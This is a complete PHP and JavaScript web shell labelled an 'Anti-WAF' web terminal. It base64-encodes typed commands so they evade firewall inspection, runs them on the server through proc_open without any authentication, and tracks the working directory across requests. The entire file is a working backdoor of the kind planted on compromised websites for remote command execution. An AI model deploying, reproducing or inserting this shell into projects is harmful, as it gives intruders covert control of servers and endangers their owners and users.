<?php
session_start();
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = __DIR__;
}

// Server-side: Executes the command if the ?b64 parameter is sent.
if (isset($_GET['b64'])) {
    ob_clean();
    header('Content-Type: application/json');

    $cmd = base64_decode($_GET['b64']);
    $output = '';

    // Get the current active folder from the session.
    $current_dir = $_SESSION['cwd'];

    // Check if the user is typing a folder navigation command (cd).
    if (preg_match('/^cd\s+(.+)$/', trim($cmd), $matches)) {
        $target = $matches[1];
        // Run the cd command and immediately call pwd to verify the new path.
        $check_cmd = "cd $current_dir && cd $target && pwd";
    } else {
        // For standard commands, run them in the current active folder.
        $check_cmd = "cd $current_dir && $cmd";
    }

    $descriptorspec = array(
       0 => array("pipe", "r"), // stdin
       1 => array("pipe", "w"), // stdout
       2 => array("pipe", "w")  // stderr
    );

    $process = proc_open($check_cmd, $descriptorspec, $pipes);

    if (is_resource($process)) {
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        // If it is a cd command, update the session with the stdout result (the new path).
        if (preg_match('/^cd\s+(.+)$/', trim($cmd))) {
            if (!empty($stdout) && empty($stderr)) {
                $_SESSION['cwd'] = trim($stdout);
                $output = ""; // CD successful, output empty
            } else {
                $output = $stderr;
            }
        } else {
            $output = $stdout . $stderr;
        }
    } else {
        $output = "Failed to execute the command using proc_open.";
    }

    // Send the results along with the latest path information.
    echo json_encode(array('output' => $output, 'pwd' => $_SESSION['cwd']));
    exit;
}

// Endpoint to retrieve initial folder information when the first page is accessed.
if (isset($_GET['get_pwd'])) {
    ob_clean();
    header('Content-Type: application/json');
    echo json_encode(array('pwd' => $_SESSION['cwd']));
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Web Terminal (Anti-WAF Persistent)</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; margin: 0; }
        #terminal { background-color: #000; border: 1px solid #333; padding: 15px; min-height: 400px; max-height: 80vh; overflow-y: auto; border-radius: 5px; box-shadow: 0 0 10px rgba(0,255,0,0.2); }
        .log-line { margin: 5px 0; white-space: pre-wrap; word-wrap: break-word; }
        .cmd-line { color: #00ffff; }
        .input-area { display: flex; margin-top: 10px; align-items: center; }
        .prompt { color: #ffb86c; font-weight: bold; margin-right: 10px; white-space: nowrap; }
        #cmdInput { flex: 1; background: transparent; border: none; color: #0f0; font-family: inherit; font-size: 16px; outline: none; }
    </style>
</head>
<body>

<h3>[+] Interactive Anti-WAF Web Terminal [+]</h3>
<p style="color: #888; font-size: 12px;">Every typed command is automatically encrypted to Base64 before being sent to the server.</p>

<div id="terminal">
    <div id="outputLog">Loading shell...</div>
    <div class="input-area">
        <span class="prompt" id="shellPrompt">server-shell$</span>
        <input type="text" id="cmdInput" autofocus autocomplete="off" disabled>
    </div>
</div>

<script>
const cmdInput = document.getElementById('cmdInput');
const outputLog = document.getElementById('outputLog');
const terminal = document.getElementById('terminal');
const shellPrompt = document.getElementById('shellPrompt');
let currentPath = "server-shell$";

// Get the initial folder upon loading.
fetch('?get_pwd=1')
    .then(r => r.json())
    .then(data => {
        currentPath = data.pwd;
        shellPrompt.textContent = currentPath + ' $';
        outputLog.innerHTML = '<div class="log-line">Web Terminal is ready. Please type a command...</div>';
        cmdInput.disabled = false;
        cmdInput.focus();
    });

cmdInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const command = cmdInput.value.trim();
        if (command === '') return;

        // 1. Display the active prompt on the screen.
        appendLog(currentPath + ' $ ' + command, 'cmd-line');
        cmdInput.value = '';

        // 2. Change command to Base64 (Client-side)
        const encodedCmd = btoa(command);

        // 3. Send the request to the server.
        fetch('?b64=' + encodeURIComponent(encodedCmd))
            .then(response => response.json())
            .then(data => {
                if (data.output && data.output.trim() !== '') {
                    appendLog(data.output);
                } else if (data.output === "") {
                    // If the output is empty (such as the effect of typing cd)
                } else {
                    appendLog('[Command executed without result/empty output]');
                }

                // Update the latest path information if a folder has been moved.
                if (data.pwd) {
                    currentPath = data.pwd;
                    shellPrompt.textContent = currentPath + ' $';
                }
            })
            .catch(error => {
                appendLog('A connection error occurred, or the request was blocked by the WAF.', 'log-line');
            });
    }
});

function appendLog(text, className = '') {
    const div = document.createElement('div');
    div.className = 'log-line ' + className;
    div.textContent = text;
    outputLog.appendChild(div);
    terminal.scrollTop = terminal.scrollHeight;
}
</script>

</body>
</html>
